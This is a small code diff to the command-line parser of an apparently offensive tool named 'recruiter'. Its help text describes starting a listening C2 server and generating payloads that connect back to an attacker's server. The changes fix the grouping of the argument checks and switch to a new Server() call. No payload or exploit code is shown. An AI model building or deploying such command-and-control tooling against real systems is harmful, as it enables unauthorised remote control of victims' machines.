@@ -48,7 +48,7 @@ int main(int argc, char **argv){
     printf("No command specified, type \"recruiter --help\" for a list of commands\n\n");
   }
 
-  else if(argc > 0 && strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0){
+  else if((argc > 0 && strcmp(argv[1], "--help") == 0) || strcmp(argv[1], "-h") == 0){
     printf("\nCommands\n--------------------------------------------------------\n");
     printf("-h, --help                                             displays this help menu\n");
     printf("-l, --listen <port>                                    starts a listening C2 server on a specified port\n");
@@ -60,19 +60,21 @@ int main(int argc, char **argv){
     printf("-l, --localhost <address>                              address that the payload will connect back to (address of attacker C2 server)\n\n");
   }  
 
-  else if(argc > 1 && strcmp(argv[1], "--listen") == 0 || strcmp(argv[1], "-l") == 0){
+  else if((argc > 1 && strcmp(argv[1], "--listen") == 0) || strcmp(argv[1], "-l") == 0){
     if (argc < 3){
       printf("Please supply a port for the server to listen on\n\n");
     } 
     else{
-    int port = (int) strtol(argv[2], (char **)NULL, 10);
-    startserv(port);
+    char *port = argv[2];
+    int protocol = SOCK_STREAM;
+    int family = AF_INET;
+    Server(NULL, port, &protocol, &family);
     }
   }
   
 
 
-  else if(argc >= 5 && strcmp(argv[1], "--generate") == 0 || strcmp(argv[1], "-g") == 0){
+  else if((argc >= 5 && strcmp(argv[1], "--generate") == 0) || strcmp(argv[1], "-g") == 0){
     
 
     if (argc < 5){
